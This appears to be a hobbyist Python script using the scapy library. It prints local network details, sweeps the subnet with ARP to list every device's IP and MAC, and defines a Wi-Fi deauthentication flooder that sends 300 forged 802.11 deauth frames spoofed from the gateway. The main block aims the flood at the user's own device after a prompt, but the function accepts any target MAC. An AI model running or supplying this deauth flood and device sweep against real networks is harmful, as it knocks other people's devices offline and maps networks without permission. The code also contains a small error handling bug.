from scapy.all import *
import scapy.all as scapy

def status():
    return conf.route
def getInter():
    return conf.route.route("8.8.8.8")[0]

def getDeviceIp():
    return conf.route.route("8.8.8.8")[1]

def GetweyIp():
    return conf.route.route("8.8.8.8")[2]

def getIDE(ipaddr):
    for inter in conf.ifaces.values():
        if inter.ip == ipaddr:
            return {"name": inter.name, "mac": inter.mac}
    return "Unkown"

def get_mac(ip):
    arp_req = ARP(pdst=ip)
    answered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/arp_req, timeout=2, verbose=False)[0]
    for _, r in answered:
        return r.hwsrc
    return None

def scan_subnet(ip):
    subnet = ".".join(ip.split(".")[:3]) + ".0/24"
    arp_req = ARP(pdst=subnet)
    answered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/arp_req, timeout=2, verbose=False)[0]
    devices = [(r.psrc, r.hwsrc) for _, r in answered]
    print(f"[*] Devices on subnet {subnet}:")
    for ip, mac in devices:
        print(f"IP: {ip}, MAC: {mac}")
    print(f"[*] Total devices found: {len(devices)}\n")

def DisUser(m,a1,interface):
    packet = RadioTap() / Dot11(addr1=m,
                                addr2=a1,
            addr3=a1) / Dot11Deauth(reason = 7)
    sendp(packet, inter=0.01,
          count=300, iface=interface,
          verbose=1)
if __name__ == "__main__":

    print(" "*30,"Network status")
    print("*"*70)
    print(status())
    print("*"*70)

    DIP=getDeviceIp()
    #Dmac=get_mac(DIP)
    IF=getIDE(DIP)
    Dmac=IF["mac"] if IF else "Unkown"
    GIP=GetweyIp()
    Gmac=get_mac(GIP)
    ifaceName=getInter()

    print("Interface:", ifaceName)
    print("Our IP:", DIP)
    print("Our MAC:", Dmac)
    print("Gateway IP:", GIP)
    print("Gateway MAC:", Gmac)
    scan_subnet(DIP)

    confirm = input("Send deauth packets? This will disconnect your device. (y/n): ")
    if confirm.lower() == "y":
        DisUser(Dmac, Gmac, ifaceName)

